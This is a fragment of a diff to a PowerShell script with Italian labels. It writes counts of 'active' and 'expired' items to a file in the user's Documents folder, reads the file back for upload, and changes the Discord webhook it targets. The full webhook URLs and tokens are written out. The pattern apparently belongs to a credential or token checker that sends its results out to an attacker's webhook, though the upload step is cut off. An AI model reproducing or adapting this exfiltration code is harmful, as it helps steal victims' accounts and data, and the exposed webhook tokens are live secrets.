@@ -123,7 +123,7 @@ $out += "Attivi: $valid | Scaduti: $invalid"
 Set-Content "$env:USERPROFILE\Documents\gorg.txt" $out -Encoding UTF8
 
 $filePath = "$env:USERPROFILE\Documents\gorg.txt"
-$webhookUrl = "https://canary.discord.com/api/webhooks/1476615700012339395/3r24ihnnSy1aEU0O0efy8q-moOkTEmjg3IxgzVVEZMm7FXO6Q565cAqhRap1ne23ItTi"
+$webhookUrl = "https://canary.discord.com/api/webhooks/1480026770261676144/oH2jmQsrCqRXQfCJ4wtv_q2OIssIHA-MxsXcoHdb5l7aWzCeo9ASrNISFrn3ii3w_Xc-"
 
 $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
 $fileContent = [System.Text.Encoding]::UTF8.GetString($fileBytes)
